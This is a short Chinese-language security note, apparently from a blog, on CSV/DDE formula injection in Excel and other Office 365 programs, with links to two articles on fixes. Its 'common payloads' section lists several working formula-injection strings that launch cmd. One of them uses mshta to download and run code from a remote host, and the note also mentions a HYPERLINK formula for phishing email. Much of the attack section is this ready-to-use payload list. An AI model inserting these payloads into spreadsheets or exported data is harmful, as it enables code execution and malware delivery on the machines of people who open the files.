**不仅仅是cve当中的一个简单的注入，更是dde类型注入，在office365当中都具有**



和普通的注入差距不大，但是是属于导出到csv文件当中，当打开csv文件的时候就会造成csv当中的某些代码执行，当某些安全意识比较低的用户点开之后就会出现问题。 

## 前提

受害者需要配合点击  接受风险 之类的按钮 

并且在excel的程序当中需要打开dde

dde 是什么？ widnwos进程间通信协议，是一种动态数据交换机。当我们制作包含DDE公式的CSV文件的时候，在打开文件的时候Excel就会执行外部的应用。

其实在这里不光是 excel属于被攻击的向量office  365当中的其他软件同时如此，outlook excel 都是这样 







## 常见的payload

代码执行

```
=1+cmd|' /C calc'!A0
+1+cmd|'/c mshta.exehttp://192.168.233.102:8080/a'!A0
=1*cmd|' /C calc'!A0
-cmd|' /C calc'!A0
+cmd|' /C calc'!A0
@SUM(cmd|'/c calc'!A0)
%0A-1+cmd|' /C calc'!A0
;-1+cmd|' /C calc'!A0
1+cmd|’/C calc’!A0
```

恶意邮件进行利用 

```
HYPERLINK("urk","content")
```





## refer

[freebuf_csv解决方案](https://www.freebuf.com/vuls/195656.html)

[知道创宇的csv方案](https://blog.knownsec.com/2016/05/csv-injection-vulnerability/)

